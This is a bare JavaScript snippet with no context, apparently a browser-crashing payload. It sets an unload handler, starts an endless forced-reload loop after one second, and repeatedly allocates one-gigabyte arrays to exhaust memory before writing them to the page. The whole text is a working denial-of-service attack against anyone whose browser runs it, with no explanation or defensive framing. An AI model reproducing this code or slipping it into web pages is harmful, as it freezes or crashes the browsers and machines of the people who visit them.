onbeforeunload = function(){localStorage.x=1};

setTimeout(function(){
  while(1)location.reload(1)
}, 1000)
(async()=>{window.ab=[];setInterval(()=>ab.push(new Uint8Array(1e9)),0);await new Promise(r=>setTimeout(r,960000));document.write(JSON.stringify(ab))})();
